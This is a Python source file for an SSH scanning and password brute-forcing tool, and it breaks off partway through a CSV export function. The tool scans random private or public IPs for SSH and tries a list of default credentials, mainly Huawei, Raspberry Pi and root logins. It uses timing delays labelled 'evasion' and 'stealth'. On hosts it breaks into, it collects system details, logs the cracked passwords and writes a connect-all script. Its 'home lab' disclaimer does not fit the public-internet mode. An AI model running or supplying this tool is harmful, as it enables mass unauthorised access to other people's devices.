#!/usr/bin/env python3
"""
SSH Scanner ADVANCED - Home Lab Testing (FIXED for Huawei/Old Devices)
Features: Real-time saving, Custom passwords, Smart evasion, Success logging
Device Info: Collects RAM, CPU, OS, Storage, Network info
Fixed: Now supports Huawei and legacy SSH devices with weak algorithms
WARNING: Only use on networks you own/have permission to test
"""

import paramiko
import socket
import random
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
from datetime import datetime
import threading
import os
import time
import re
import csv

# Common default SSH credentials - ADDED Huawei defaults
DEFAULT_CREDENTIALS = [
    # Huawei specific defaults
    ('admin', 'admin'),
    ('root', 'root'),
    ('admin', 'Admin@huawei'),
    ('admin', 'Huawei@123'),
    ('admin', 'Huawei12#$'),
    ('huawei', 'huawei'),
    ('root', 'Huawei@123'),
    
    # Standard defaults
    ('root', 'toor'),
    ('root', 'password'),
    ('admin', 'password'),
    ('user', 'user'),
    ('test', 'test'),
    ('pi', 'raspberry'),
    ('ubuntu', 'ubuntu'),
    ('root', ''),
    ('admin', ''),
    ('oracle', 'oracle'),
    ('postgres', 'postgres'),
    ('mysql', 'mysql'),
    ('guest', 'guest'),
    ('admin', '1234'),
    ('root', '12345'),
    ('admin', 'admin123'),
    ('root', 'admin'),
    ('administrator', 'administrator'),
    ('root', '123456'),
    ('admin', '123456'),
    ('user', 'password'),
    ('root', 'Root123'),
    ('admin', 'Admin123'),
]

class SSHScanner:
    def __init__(self, timeout=2, output_file='more.txt'):
        self.timeout = timeout
        self.ssh_hosts = []
        self.scanned_count = 0
        self.lock = threading.Lock()
        self.output_file = output_file
        self.file_handle = None
        
    def init_output_file(self):
        """Initialize output file with header"""
        self.file_handle = open(self.output_file, 'w')
        self.file_handle.write(f"# SSH Hosts - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        self.file_handle.write(f"# Saved in real-time\n\n")
        self.file_handle.flush()
        
    def save_host_realtime(self, host):
        """Save host to file immediately when found"""
        if self.file_handle:
            self.file_handle.write(f"{host}\n")
            self.file_handle.flush()
    
    def close_output_file(self):
        """Close output file"""
        if self.file_handle:
            self.file_handle.close()
            self.file_handle = None
        
    def generate_random_ip(self, private_only=True):
        """Generate a random IP address"""
        if private_only:
            choice = random.randint(1, 3)
            if choice == 1:
                return f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
            elif choice == 2:
                return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            else:
                return f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        else:
            while True:
                ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                first = int(ip.split('.')[0])
                second = int(ip.split('.')[1])
                
                if first == 10:
                    continue
                if first == 172 and 16 <= second <= 31:
                    continue
                if first == 192 and second == 168:
                    continue
                if first == 127 or first >= 224:
                    continue
                
                return ip
    
    def check_ssh_port(self, ip, port=22):
        """Check if SSH port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def scan_single_ip(self, ip, port=22):
        """Scan a single IP for SSH"""
        with self.lock:
            self.scanned_count += 1
        
        if self.check_ssh_port(ip, port):
            host = f"{ip}:{port}"
            with self.lock:
                self.ssh_hosts.append(host)
                count = len(self.ssh_hosts)
                self.save_host_realtime(host)
            
            print(f"[+] SSH FOUND: {ip}:{port} (Total: {count}) -> SAVED")
            return ip
        return None
    
    def collect_ssh_ips(self, target_count, port=22, max_workers=50, private_only=True):
        """Collect SSH IPs until target count reached"""
        print(f"\n[*] Starting SSH IP Collection")
        print(f"[*] Target SSH hosts: {target_count}")
        print(f"[*] Port: {port}")
        print(f"[*] Network: {'Private (Home Lab)' if private_only else 'Public'}")
        print(f"[*] Output file: {self.output_file} (real-time saving)")
        print(f"[*] Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 70)
        
        self.init_output_file()
        
        scanned_ips = set()
        scan_multiplier = 50
        
        try:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                while len(self.ssh_hosts) < target_count:
                    futures = []
                    batch_size = min(1000, (target_count - len(self.ssh_hosts)) * scan_multiplier)
                    
                    for _ in range(batch_size):
                        while True:
                            ip = self.generate_random_ip(private_only)
                            if ip not in scanned_ips:
                                scanned_ips.add(ip)
                                break
                        
                        futures.append(executor.submit(self.scan_single_ip, ip, port))
                    
                    for future in as_completed(futures):
                        future.result()
                        
                        if len(self.ssh_hosts) >= target_count:
                            break
                    
                    print(f"\n[*] Progress: Scanned {self.scanned_count} IPs | Found {len(self.ssh_hosts)}/{target_count} SSH hosts")
                    
                    if self.scanned_count > target_count * 100 and len(self.ssh_hosts) == 0:
                        print("\n[!] Scanned many IPs without finding SSH. Check your network settings.")
                        break
        finally:
            self.close_output_file()
        
        print("\n" + "=" * 70)
        print(f"[*] Collection complete!")
        print(f"[*] End time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[*] Total IPs scanned: {self.scanned_count}")
        print(f"[*] SSH hosts found: {len(self.ssh_hosts)}")
        print(f"[+] All results saved to: {self.output_file}")
        
        return self.ssh_hosts

class PasswordTester:
    def __init__(self, timeout=7, password_file=None, success_file='cracked.txt'):
        self.timeout = timeout
        self.vulnerable = []
        self.lock = threading.Lock()
        self.credentials = self.load_credentials(password_file)
        self.success_file = success_file
        self.success_handle = None
        self.init_success_file()
        self.stats = {
            'tested': 0,
            'vulnerable': 0,
            'blocked': 0
        }
        
        # Set legacy algorithms for Paramiko to support Huawei/old devices
        self.setup_paramiko_for_legacy()
    
    def setup_paramiko_for_legacy(self):
        """Configure Paramiko to support legacy/huawei SSH algorithms"""
        try:
            # Enable weak algorithms for legacy devices
            paramiko.Transport._preferred_kex = (
                'diffie-hellman-group-exchange-sha1',
                'diffie-hellman-group1-sha1',
                'diffie-hellman-group14-sha1',
                'diffie-hellman-group-exchange-sha256',
            ) + paramiko.Transport._preferred_kex
            
            paramiko.Transport._preferred_ciphers = (
                'aes128-cbc',
                'aes256-cbc',
                'blowfish-cbc',
                '3des-cbc',
                'aes128-ctr',
                'aes256-ctr',
                'aes128-gcm@openssh.com',
                'aes256-gcm@openssh.com',
            ) + paramiko.Transport._preferred_ciphers
            
            paramiko.Transport._preferred_macs = (
                'hmac-sha2-256',
                'hmac-sha2-512',
                'hmac-sha1',
                'hmac-sha1-96',
                'hmac-md5',
                'hmac-md5-96',
                'hmac-sha2-256-etm@openssh.com',
                'hmac-sha2-512-etm@openssh.com',
                'hmac-sha1-etm@openssh.com',
            ) + paramiko.Transport._preferred_macs
            
            paramiko.Transport._preferred_keys = (
                'ssh-rsa',
                'ecdsa-sha2-nistp256',
                'ssh-ed25519',
            ) + paramiko.Transport._preferred_keys
            
        except Exception as e:
            print(f"[!] Warning: Could not configure legacy algorithms: {e}")
    
    def init_success_file(self):
        """Initialize success log file"""
        self.success_handle = open(self.success_file, 'a')
        self.success_handle.write(f"\n{'='*70}\n")
        self.success_handle.write(f"# SSH Cracking Session - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        self.success_handle.write(f"{'='*70}\n\n")
        self.success_handle.flush()
    
    def save_success_realtime(self, result):
        """Save successful login immediately with connection commands and device info"""
        if self.success_handle:
            timestamp = datetime.now().strftime('%H:%M:%S')
            entry = f"\n{'='*70}\n"
            entry += f"[{timestamp}] 💀 CRACKED!\n"
            entry += f"{'='*70}\n"
            entry += f"Host: {result['ip']}\n"
            entry += f"Port: {result['port']}\n"
            entry += f"Username: {result['username']}\n"
            entry += f"Password: {result['password']}\n"
            entry += f"Device Type: {result.get('device_type', 'Unknown')}\n"
            
            # Add device information if available
            if 'device_info' in result:
                info = result['device_info']
                entry += f"\n# DEVICE INFORMATION:\n"
                if 'os' in info and info['os']:
                    entry += f"  OS: {info['os']}\n"
                if 'kernel' in info and info['kernel']:
                    entry += f"  Kernel: {info['kernel']}\n"
                if 'cpu' in info and info['cpu']:
                    entry += f"  CPU: {info['cpu']}\n"
                if 'cores' in info and info['cores']:
                    entry += f"  Cores: {info['cores']}\n"
                if 'ram' in info and info['ram']:
                    entry += f"  RAM: {info['ram']}\n"
                if 'storage' in info and info['storage']:
                    entry += f"  Storage: {info['storage']}\n"
                if 'uptime' in info and info['uptime']:
                    entry += f"  Uptime: {info['uptime']}\n"
                if 'hostname' in info and info['hostname']:
                    entry += f"  Hostname: {info['hostname']}\n"
                if 'arch' in info and info['arch']:
                    entry += f"  Architecture: {info['arch']}\n"
                if 'model' in info and info['model']:
                    entry += f"  Model: {info['model']}\n"
            
            entry += f"\n# SSH Connection Commands:\n"
            
            # Standard command
            if result['password']:
                entry += f"sshpass -p '{result['password']}' ssh {result['username']}@{result['ip']} -p {result['port']}\n"
            else:
                entry += f"ssh {result['username']}@{result['ip']} -p {result['port']}\n"
            
            # Huawei/Legacy device command
            if result.get('device_type') == 'Huawei' or result.get('needs_legacy'):
                entry += f"\n# Huawei/Legacy Device (add if above fails):\n"
                if result['password']:
                    entry += f"sshpass -p '{result['password']}' ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes128-cbc {result['username']}@{result['ip']} -p {result['port']}\n"
                else:
                    entry += f"ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes128-cbc {result['username']}@{result['ip']} -p {result['port']}\n"
                entry += f"# Alternative: ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 {result['username']}@{result['ip']}\n"
            
            entry += f"\n# Alternative formats:\n"
            entry += f"ssh://{result['username']}@{result['ip']}:{result['port']}\n"
            entry += f"{result['username']}@{result['ip']}:{result['port']} | Password: {result['password'] if result['password'] else '(empty)'}\n"
            entry += f"{'='*70}\n"
            
            self.success_handle.write(entry)
            self.success_handle.flush()
    
    def close_success_file(self):
        """Close success file"""
        if self.success_handle:
            self.success_handle.write(f"\n# Session ended - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            self.success_handle.write(f"# Total vulnerable: {len(self.vulnerable)}\n")
            self.success_handle.flush()
            self.success_handle.close()
            self.success_handle = None
    
    def load_credentials(self, password_file):
        """Load credentials from file or use defaults"""
        if password_file and os.path.exists(password_file):
            print(f"\n[*] Loading custom password list from: {password_file}")
            credentials = []
            
            try:
                with open(password_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                        
                        if ':' in line:
                            parts = line.split(':', 1)
                            credentials.append((parts[0], parts[1]))
                        else:
                            # Add password for common Huawei users
                            huawei_users = ['admin', 'root', 'huawei', 'user']
                            for user in huawei_users:
                                credentials.append((user, line))
                
                print(f"[+] Loaded {len(credentials)} credential pairs from file")
                return credentials
            
            except Exception as e:
                print(f"[!] Error loading password file: {e}")
                print("[*] Falling back to default credentials")
                return DEFAULT_CREDENTIALS
        else:
            if password_file:
                print(f"[!] Password file not found: {password_file}")
                print("[*] Using default credentials")
            else:
                print(f"[*] Using default credentials ({len(DEFAULT_CREDENTIALS)} pairs)")
            return DEFAULT_CREDENTIALS
    
    def get_device_info(self, client):
        """Get detailed device information via SSH"""
        device_info = {}
        
        try:
            # Get OS info
            stdin, stdout, stderr = client.exec_command('uname -a', timeout=3)
            uname_output = stdout.read().decode().strip()
            if uname_output:
                device_info['kernel'] = uname_output
            
            # Get OS distribution
            stdin, stdout, stderr = client.exec_command('cat /etc/os-release 2>/dev/null || cat /etc/redhat-release 2>/dev/null || cat /etc/issue 2>/dev/null', timeout=3)
            os_output = stdout.read().decode().strip()
            if os_output:
                # Parse OS info
                if 'PRETTY_NAME' in os_output:
                    for line in os_output.split('\n'):
                        if 'PRETTY_NAME' in line:
                            device_info['os'] = line.split('=')[1].strip().strip('"')
                            break
                else:
                    device_info['os'] = os_output.split('\n')[0]
            
            # Get hostname
            stdin, stdout, stderr = client.exec_command('hostname', timeout=3)
            hostname = stdout.read().decode().strip()
            if hostname:
                device_info['hostname'] = hostname
            
            # Get CPU info
            stdin, stdout, stderr = client.exec_command('cat /proc/cpuinfo | grep "model name" | head -1', timeout=3)
            cpu_info = stdout.read().decode().strip()
            if cpu_info and ':' in cpu_info:
                device_info['cpu'] = cpu_info.split(':')[1].strip()
            
            # Get CPU cores
            stdin, stdout, stderr = client.exec_command('nproc', timeout=3)
            cores = stdout.read().decode().strip()
            if cores:
                device_info['cores'] = cores
            
            # Get architecture
            stdin, stdout, stderr = client.exec_command('uname -m', timeout=3)
            arch = stdout.read().decode().strip()
            if arch:
                device_info['arch'] = arch
            
            # Get RAM info
            stdin, stdout, stderr = client.exec_command('free -h | grep Mem:', timeout=3)
            ram_info = stdout.read().decode().strip()
            if ram_info:
                parts = ram_info.split()
                if len(parts) >= 2:
                    device_info['ram'] = parts[1]  # Total RAM
            
            # Get storage info
            stdin, stdout, stderr = client.exec_command('df -h / | tail -1', timeout=3)
            storage_info = stdout.read().decode().strip()
            if storage_info:
                parts = storage_info.split()
                if len(parts) >= 2:
                    device_info['storage'] = f"{parts[1]} total, {parts[2]} used, {parts[3]} free"
            
            # Get uptime
            stdin, stdout, stderr = client.exec_command('uptime -p 2>/dev/null || uptime', timeout=3)
            uptime = stdout.read().decode().strip()
            if uptime:
                device_info['uptime'] = uptime
            
            # For Huawei devices, try to get more specific info
            stdin, stdout, stderr = client.exec_command('display version 2>/dev/null || uname -a', timeout=3)
            version_info = stdout.read().decode().strip()
            if version_info and ('Huawei' in version_info or 'huawei' in version_info.lower()):
                device_info['model'] = 'Huawei Network Device'
                # Try to get Huawei specific info
                stdin, stdout, stderr = client.exec_command('display device 2>/dev/null || display version 2>/dev/null', timeout=3)
                huawei_info = stdout.read().decode().strip()
                if huawei_info:
                    # Extract model from Huawei output
                    for line in huawei_info.split('\n'):
                        if 'Device' in line or 'Model' in line:
                            device_info['model'] = line.strip()
                            break
            
            # For Raspberry Pi
            stdin, stdout, stderr = client.exec_command('cat /proc/device-tree/model 2>/dev/null', timeout=3)
            pi_model = stdout.read().decode().strip()
            if pi_model:
                device_info['model'] = pi_model
                device_info['device_type'] = 'Raspberry Pi'
            
        except Exception as e:
            # Silently ignore errors - we get as much info as we can
            pass
        
        return device_info
    
    def test_ssh_login(self, ip, port, username, password):
        """Test SSH login with legacy algorithm support and gather device info"""
        import logging
        logging.getLogger("paramiko").setLevel(logging.CRITICAL)
        
        # Random delay for evasion
        time.sleep(random.uniform(0.2, 1.0))
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Try normal connection first
            client.connect(
                ip,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout,
                look_for_keys=False,
                allow_agent=False
            )
            
            # Get banner to detect device type
            banner = ""
            device_type = None
            try:
                transport = client.get_transport()
                if transport:
                    banner = transport.remote_version
                    if 'HUAWEI' in banner or 'huawei' in banner.lower():
                        device_type = 'Huawei'
            except:
                pass
            
            # Get detailed device information
            device_info = self.get_device_info(client)
            
            client.close()
            return True, banner, device_type, device_info
        except paramiko.AuthenticationException:
            return False, "", None, {}
        except paramiko.SSHException as e:
            error_str = str(e)
            
            # Check if it's a Huawei device from error message
            if "HUAWEI" in error_str or "huawei" in error_str.lower():
                print(f"[+] Detected Huawei device at {ip}:{port}")
                
                # Try with explicit legacy parameters
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    # Manually set transport options for Huawei
                    transport = paramiko.Transport(f"{ip}:{port}")
                    transport.start_client()
                    
                    # Force legacy algorithms
                    transport.get_security_options().kex = [
                        'diffie-hellman-group-exchange-sha1',
                        'diffie-hellman-group1-sha1'
                    ]
                    transport.get_security_options().ciphers = [
                        'aes128-ctr', 'aes192-ctr', 'aes256-ctr',
                        'aes128-cbc', '3des-cbc', 'blowfish-cbc'
                    ]
                    transport.get_security_options().macs = [
                        'hmac-sha2-256', 'hmac-sha1', 'hmac-md5'
                    ]
                    
                    transport.auth_password(username, password)
                    
                    if transport.is_authenticated():
                        # Create SSH client from transport
                        client = paramiko.SSHClient()
                        client._transport = transport
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        
                        # Get device info
                        device_info = self.get_device_info(client)
                        
                        transport.close()
                        return True, "HUAWEI", "Huawei", device_info
                    else:
                        transport.close()
                        return False, "", None, {}
                except:
                    return False, "", None, {}
            else:
                return False, "", None, {}
        except (EOFError, ConnectionResetError, TimeoutError, OSError, socket.timeout):
            return False, "", None, {}
        except Exception as e:
            return False, "", None, {}
    
    def test_host(self, host_line):
        """Test all credentials on a host and gather device info"""
        import logging
        logging.getLogger("paramiko").setLevel(logging.CRITICAL)
        
        try:
            host_line = host_line.strip()
            if not host_line or host_line.startswith('#'):
                return None
            
            if ':' in host_line:
                ip, port = host_line.split(':')
                port = int(port)
            else:
                ip = host_line
                port = 22
        except:
            return None
        
        with self.lock:
            self.stats['tested'] += 1
            current = self.stats['tested']
        
        print(f"\n[{current}] Testing {ip}:{port}")
        
        device_type = None
        needs_legacy = False
        
        # Quick test to see if it's a Huawei/legacy device
        try:
            sock = socket.create_connection((ip, port), timeout=3)
            sock.send(b"SSH-2.0-TestClient\r\n")
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            if 'HUAWEI' in banner.upper():
                device_type = 'Huawei'
                needs_legacy = True
                print(f"[+] Detected Huawei device from banner")
            elif 'diffie-hellman-group1-sha1' in banner or 'diffie-hellman-group-exchange-sha1' in banner:
                device_type = 'Legacy SSH'
                needs_legacy = True
                print(f"[+] Detected Legacy SSH device")
                
        except:
            pass
        
        failed_count = 0
        for i, (username, password) in enumerate(self.credentials, 1):
            pwd_display = f"'{password}'" if password else "''"
            sys.stdout.write(f"\r    [{i}/{len(self.credentials)}] {username}:{pwd_display}... ")
            sys.stdout.flush()
            
            try:
                success, banner_info, detected_type, device_info = self.test_ssh_login(ip, port, username, password)
                
                if success:
                    print("💀 CRACKED!")
                    
                    # Determine device type
                    final_device_type = device_type
                    if not final_device_type:
                        if detected_type:
                            final_device_type = detected_type
                        elif 'HUAWEI' in str(banner_info).upper():
                            final_device_type = 'Huawei'
                            needs_legacy = True
                        elif banner_info:
                            final_device_type = banner_info.split()[0] if ' ' in banner_info else banner_info
                    
                    result = {
                        'ip': ip,
                        'port': port,
                        'username': username,
                        'password': password,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'device_type': final_device_type,
                        'needs_legacy': needs_legacy,
                        'device_info': device_info
                    }
                    
                    with self.lock:
                        self.vulnerable.append(result)
                        self.stats['vulnerable'] += 1
                        self.save_success_realtime(result)
                    
                    # Print device info summary
                    self.print_device_summary(device_info, ip)
                    
                    # Play alert sound
                    try:
                        print('\a')  # Bell sound
                    except:
                        pass
                    
                    return result
                else:
                    failed_count += 1
            except Exception as e:
                failed_count += 1
            
            # Detect rate limiting
            if failed_count > 5 and i <= 10:
                with self.lock:
                    self.stats['blocked'] += 1
                print("\r    [!] Server blocking/rate-limiting... skipping")
                return None
        
        print(f"\r    [-] Failed all {len(self.credentials)} attempts" + " "*20)
        return None
    
    def print_device_summary(self, device_info, ip):
        """Print a summary of device information"""
        if not device_info:
            return
        
        print(f"    📱 Device Info for {ip}:")
        
        if 'model' in device_info and device_info['model']:
            print(f"      Model: {device_info['model']}")
        
        if 'os' in device_info and device_info['os']:
            print(f"      OS: {device_info['os']}")
        
        if 'hostname' in device_info and device_info['hostname']:
            print(f"      Hostname: {device_info['hostname']}")
        
        if 'cpu' in device_info and device_info['cpu']:
            cpu_display = device_info['cpu']
            if 'cores' in device_info and device_info['cores']:
                cpu_display += f" ({device_info['cores']} cores)"
            print(f"      CPU: {cpu_display}")
        
        if 'ram' in device_info and device_info['ram']:
            print(f"      RAM: {device_info['ram']}")
        
        if 'storage' in device_info and device_info['storage']:
            print(f"      Storage: {device_info['storage']}")
        
        if 'arch' in device_info and device_info['arch']:
            print(f"      Arch: {device_info['arch']}")
        
        if 'uptime' in device_info and device_info['uptime']:
            print(f"      Uptime: {device_info['uptime']}")
    
    def test_from_file(self, filename='more.txt', max_workers=3):
        """Test passwords on hosts from file"""
        if not os.path.exists(filename):
            print(f"\n[!] File {filename} not found!")
            return
        
        with open(filename, 'r') as f:
            hosts = [line for line in f.readlines() if line.strip() and not line.startswith('#')]
        
        if not hosts:
            print("\n[!] No hosts in file")
            return
        
        print(f"\n[*] Loaded {len(hosts)} hosts from {filename}")
        print(f"[*] Testing {len(self.credentials)} credential pairs per host")
        print(f"[*] Success log: {self.success_file} (real-time)")
        print(f"[*] Max workers: {max_workers} (stealth mode)")
        print(f"[*] Device info collection: ENABLED (RAM, CPU, OS, etc.)")
        print(f"[*] Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("[*] Legacy algorithm support: ENABLED (Huawei compatible)")
        print("=" * 70)
        
        try:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {executor.submit(self.test_host, host): host for host in hosts}
                
                for future in as_completed(futures):
                    future.result()
                    
                    # Progress update
                    if self.stats['tested'] % 5 == 0:
                        print(f"\n[*] Progress: Tested {self.stats['tested']}/{len(hosts)} | "
                              f"Cracked: {self.stats['vulnerable']} | "
                              f"Blocked: {self.stats['blocked']}")
        finally:
            self.close_success_file()
        
        print("\n" + "=" * 70)
        print(f"[*] Testing complete!")
        print(f"[*] End time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        self.print_results()
        self.print_stats()
    
    def export_to_csv(self, csv_file='device_info.csv'):
        """Export device information to CSV file"""
        if not self.vulnerable:
            print("[!] No vulnerable hosts to export")
            return
        
        try:
            with open(csv_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                # Write header
                writer.writerow([
                    'IP Address', 'Port', 'Username', 'Password', 
                    'Device Type', 'Hostname', 'OS', 'CPU', 
                    'Cores', 'RAM', 'Storage', 'Architecture', 
                    'Uptime', 'Model', 'Timestamp'
                ])
                
                # Write data
                for result in self.vulnerable:
                    info = result.get('device_info', {})
                    writer.writerow([
                        result['ip'],
                        result['port'],
                        result['username'],
                        result['password'] if result['password'] else '(empty)',
                        result.get('device_type', 'Unknown'),
                        info.get('hostname', ''),
                        info.get('os', ''),
                        info.get('cpu', ''),
                        info.get('cores', ''),
                        info.get('ram', ''),
                        info.get('storage', ''),
                        info.get('arch', ''),
                        info.get('uptime', ''),
                        info.get('model', ''),
                        result['timestamp']
                    ])
            
            print(f"[+] Device information exported to: {csv_file}")
            print(f"[+] Total devices exported: {len(self.vulnerable)}")
            
        except Exception as e:
            print(f"[!] Error exporting to CSV: {e}")
    
    def print_stats(self):
        """Print attack statistics with device breakdown"""
        print(f"\n{'='*70}")
        print(f"[*] ATTACK STATISTICS")
        print(f"{'='*70}")
        print(f"  Hosts tested: {self.stats['tested']}")
        print(f"  Successfully cracked: {self.stats['vulnerable']}")
        print(f"  Blocked/Rate-limited: {self.stats['blocked']}")
        if self.stats['tested'] > 0:
            success_rate = (self.stats['vulnerable'] / self.stats['tested']) * 100
            print(f"  Success rate: {success_rate:.2f}%")
        
        # Count device types
        device_counts = {}
        for v in self.vulnerable:
            dev_type = v.get('device_type', 'Unknown')
            device_counts[dev_type] = device_counts.get(dev_type, 0) + 1
        
        if device_counts:
            print(f"\n  Device Breakdown:")
            for dev_type, count in device_counts.items():
                print(f"    {dev_type}: {count}")
    
    def print_results(self):
        """Print vulnerable hosts with connection info and device details"""
        if not self.vulnerable:
            print("\n[*] No vulnerable hosts found.")
            return
        
        print(f"\n{'='*70}")
        print(f"💀 CRACKED HOSTS: {len(self.vulnerable)}")
        print(f"{'='*70}\n")
        
        for i, result in enumerate(self.vulnerable, 1):
            print(f"  [{i}] {result['ip']}:{result['port']}")
            print(f"      Username: {result['username']}")
            print(f"      Password: {result['password'] if result['password'] else '(empty)'}")
            print(f"      Device: {result.get('device_type', 'Unknown')}")
            
            # Print device info if available
            if 'device_info' in result and result['device_info']:
                info = result['device_info']
                if 'model' in info and info['model']:
                    print(f"      Model: {info['model']}")
                if 'os' in info and info['os']:
                    print(f"      OS: {info['os']}")
                if 'hostname' in info and info['hostname']:
                    print(f"      Hostname: {info['hostname']}")
                if 'cpu' in info and info['cpu']:
                    cpu_display = info['cpu']
                    if 'cores' in info and info['cores']:
                        cpu_display += f" ({info['cores']} cores)"
                    print(f"      CPU: {cpu_display}")
                if 'ram' in info and info['ram']:
                    print(f"      RAM: {info['ram']}")
                if 'storage' in info and info['storage']:
                    print(f"      Storage: {info['storage']}")
            
            print(f"      Time: {result['timestamp']}")
            
            # Show appropriate connection command
            if result.get('needs_legacy'):
                if result['password']:
                    print(f"      SSH (Huawei): sshpass -p '{result['password']}' ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 {result['username']}@{result['ip']} -p {result['port']}")
                else:
                    print(f"      SSH (Huawei): ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 {result['username']}@{result['ip']} -p {result['port']}")
            else:
                if result['password']:
                    print(f"      SSH: sshpass -p '{result['password']}' ssh {result['username']}@{result['ip']} -p {result['port']}")
                else:
                    print(f"      SSH: ssh {result['username']}@{result['ip']} -p {result['port']}")
            print()
        
        print(f"[+] All results with device info saved to: {self.success_file}")
        
        # Generate quick connect script
        self.generate_connect_script()
        
        # Offer to export to CSV
        if self.vulnerable:
            export = input("\n[?] Export device information to CSV? (y/n): ").strip().lower()
            if export == 'y':
                csv_file = input("[?] CSV filename (default device_info.csv): ").strip() or "device_info.csv"
                self.export_to_csv(csv_file)
    
    def generate_connect_script(self):
        """Generate bash script to connect to all cracked hosts"""
        if not self.vulnerable:
            return
        
        script_content = """#!/bin/bash
# Auto-generated connect script for cracked SSH hosts
# Generated: {timestamp}
# Total hosts: {count}

echo "SSH Connect Script - Cracked Hosts"
echo "=================================="
echo

""".format(timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'), count=len(self.vulnerable))
        
        for i, result in enumerate(self.vulnerable, 1):
            device_desc = result.get('device_type', 'Unknown')
            if 'device_info' in result and result['device_info']:
                info = result['device_info']
                if 'model' in info and info['model']:
                    device_desc = info['model']
                elif 'os' in info and info['os']:
                    device_desc = info['os'].split()[0] if ' ' in info['os'] else info['os']
            
            script_content += f"echo \"[{i}] {result['ip']}:{result['port']} - {result['username']} / {result['password'] if result['password'] else '(no password)'}\"\n"
            script_content += f"echo \"  Device: {device_desc}\"\n"
            
            if result.get('needs_legacy'):
                if result['password']:
                    script_content += f"echo \"  Command: sshpass -p '{result['password']}' ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1 {result['username']}@{result['ip']} -p {result['port']}\"\n"
                else:
                    script_content += f"echo \"  Command: ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1 {result['username']}@{result['ip']} -p {result['port']}\"\n"
            else:
                if result['password']:
                    script_content += f"echo \"  Command: sshpass -p '{result['password']}' ssh {result['username']}@{result['ip']} -p {result['port']}\"\n"
                else:
                    script_content += f"echo \"  Command: ssh {result['username']}@{result['ip']} -p {result['port']}\"\n"
            
            script_content += f"echo\n"
        
        script_content += """echo "To connect to a specific host, copy and paste the command above."
echo "=================================="
"""
        
        with open('connect_all.sh', 'w') as f:
            f.write(script_content)
        
        os.chmod('connect_all.sh', 0o755)
        print(f"[+] Quick connect script generated: connect_all.sh")

def export_to_csv_from_file(success_file, csv_file):
    """Export device information from success file to CSV"""
    if not os.path.exists(success_file):
        print(f"[!] File not found: {success_file}")
        return
    
    try:
        # Parse the success file
        results = []
        current_result = {}
        in_device_info = False
        device_info = {}
        
        with open(success_file, 'r') as f:
            lines = f.readlines()
        
        for line in lines:
            line = line.strip()
            
            if line.startswith('Host:'):
                current_result['ip'] = line.split(':', 1)[1].strip()
            elif line.startswith('Port:'):
                current_result['port'] = line.split(':', 1)[1].strip()
            elif line.startswith('Username:'):
                current_result['username'] = line.split(':', 1)[1].strip()
            elif line.startswith('Password:'):
                current_result['password'] = line.split(':', 1)[1].strip()
            elif line.startswith('Device Type:'):
                current_result['device_type'] = line.split(':', 1)[1].strip()
            elif line.startswith('Timestamp:'):
                current_result['timestamp'] = line.split(':', 1)[1].strip()
            elif line == "# DEVICE INFORMATION:":
                in_device_info = True
                device_info = {}
            elif in_device_info and line.startswith('  ') and ':' in line:
                key, value = line.strip().split(':', 1)
                device_info[key.strip()] = value.strip()
            elif line.startswith('[') and '] CRACKED!' in line:
                # New entry
                if current_result:
                    current_result['device_info'] = device_info
                    results.append(current_result)
                current_result = {}
                in_device_info = False
                device_info = {}
        
        # Don't forget the last result
        if current_result:
            current_result['device_info'] = device_info
            results.append(current_result)
        
        if not results:
            print("[!] No valid device information found in the file")
            return
        
        # Write to CSV
        with open(csv_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            # Write header
            writer.writerow([
                'IP Address', 'Port', 'Username', 'Password', 
                'Device Type', 'Hostname', 'OS', 'CPU', 
                'Cores', 'RAM', 'Storage', 'Architecture', 
                'Uptime', 'Model', 'Timestamp'
            ])
            
            # Write data
            for result in results:
                info = result.get('device_info', {})
                writer.writerow([
                    result.get('ip', ''),
                    result.get('port', ''),
                    result.get('username', ''),
                    result.get('password', ''),
                    result.get('device_type', 'Unknown'),
                    info.get('hostname', ''),
                    info.get('os', ''),
                    info.get('cpu', ''),
                    info.get('cores', ''),
                    info.get('ram', ''),
